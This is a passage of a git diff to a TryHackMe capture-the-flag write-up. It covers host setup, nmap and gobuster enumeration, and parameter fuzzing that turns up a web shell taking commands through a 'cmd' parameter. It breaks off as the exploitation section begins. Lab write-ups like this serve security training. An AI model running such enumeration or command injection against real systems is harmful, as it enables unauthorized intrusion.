@@ -3,18 +3,24 @@ tags:
   - THM
   - Easy
   - Linux
-  - RCE
-  - Leakage
+  - Fuzzing
+  - Web-Shell
   - Stego
   - Sudo
+  - Cmd-Injection
 ---
+
 https://tryhackme.com/room/yueiua/
+
 # Add Hosts
+
 Append to the `/etc/hosts` file:
 ```text
 10.10.182.154 uahs.thm
 ```
+
 # Scanning
+
 ```console
 $ nmap -p22,80 -sV -sC uahs.thm
 
@@ -29,8 +35,11 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 # Enumeration
-Discovered `/assets/index.php` file, which happens to be a reverse shell:
+
+Discovered `/assets/index.php` file, which happens to be a web shell:
+
 ```console
 $ gobuster dir -q -b 403,404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://uahs.thm/
 /assets               (Status: 301) [Size: 305] [--> http://uahs.thm/assets/]
@@ -39,7 +48,12 @@ $ gobuster dir -q -b 403,404 -w /usr/share/seclists/Discovery/Web-Content/common
 $ gobuster dir -q -b 403,404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://uahs.thm/assets/
 /images               (Status: 301) [Size: 312] [--> http://uahs.thm/assets/images/]
 /index.php            (Status: 200) [Size: 0]
+
+$ gobuster fuzz -q -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://uahs.thm/assets/index.php?FUZZ=id' --xl 0
+[Status=200] [Length=72] [Word=cmd] http://10.65.163.187/assets/index.php?cmd=id
 ```
+
+
 # Exploitation
 Wait for connections:
 ```bash
